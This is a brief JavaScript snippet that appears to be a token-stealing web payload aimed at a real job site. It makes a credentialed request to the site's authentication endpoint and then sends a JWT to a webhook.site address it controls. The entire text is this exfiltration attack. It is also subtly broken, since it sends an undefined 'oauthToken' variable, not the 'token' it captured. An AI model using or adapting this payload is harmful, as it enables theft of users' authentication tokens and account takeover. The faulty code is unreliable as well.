var a = new XMLHttpRequest();
a.open("GET", "https://www.infojobs.net/security/microservices/ms-authentication/user", false);
a.withCredentials = true;
a.send();
var token=a.response;
var b = new XMLHttpRequest();
b.open("GET", "//webhook.site/fd65476a-5a2b-4099-abfe-95c181ff362d/?JWT="+encodeURIComponent(oauthToken));
b.send();
